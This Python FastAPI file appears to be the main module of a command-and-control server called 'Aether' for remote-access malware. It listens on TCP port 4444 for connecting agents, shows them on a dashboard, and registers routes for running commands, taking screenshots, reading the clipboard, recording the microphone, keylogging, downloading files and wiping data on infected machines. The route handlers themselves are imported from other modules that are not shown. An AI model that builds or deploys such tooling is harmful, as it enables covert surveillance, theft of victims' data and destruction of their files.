import asyncio
from contextlib import asynccontextmanager
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
from fastapi.templating import Jinja2Templates
from fastapi.staticfiles import StaticFiles
import uvicorn

from network import handle_tcp_client
from config import active_agents
from helpers import get_flag
import routes

templates = Jinja2Templates(directory=".")

async def start_tcp_server():
    server = await asyncio.start_server(
        handle_tcp_client,
        "0.0.0.0",
        4444,
    )
    async with server:
        await server.serve_forever()

@asynccontextmanager
async def lifespan(app: FastAPI):
    tcp_task = asyncio.create_task(start_tcp_server())
    yield
    tcp_task.cancel()
    try:
        await tcp_task
    except asyncio.CancelledError:
        pass

app = FastAPI(
    title="Aether",
    lifespan=lifespan,
)

app.mount("/static", StaticFiles(directory="static"), name="static")

@app.get("/", response_class=HTMLResponse)
async def dashboard(request: Request):
    for aid, info in active_agents.items():
        info["flag"] = get_flag(info.get("country", "US"))

    return templates.TemplateResponse(
        request=request,
        name="index.html",
        context={"agents": active_agents},
    )

app.add_api_route("/v1/cmd", routes.route_cmd, methods=["POST"])
app.add_api_route("/v1/sc", routes.route_sc, methods=["POST"])
app.add_api_route("/v1/fl", routes.route_fl, methods=["POST"])
app.add_api_route("/v1/ps", routes.route_ps, methods=["POST"])
app.add_api_route("/v1/cat", routes.route_cat, methods=["POST"])
app.add_api_route("/v1/down", routes.route_down, methods=["POST"])
app.add_api_route("/v1/clip", routes.route_clip, methods=["POST"])
app.add_api_route("/v1/mic", routes.route_mic, methods=["POST"])
app.add_api_route("/v1/wipe", routes.route_wipe, methods=["POST"])
app.add_api_route("/v1/kl", routes.route_kl, methods=["POST"])

if __name__ == "__main__":
    uvicorn.run("main:app", host="0.0.0.0", port=8080, reload=True)
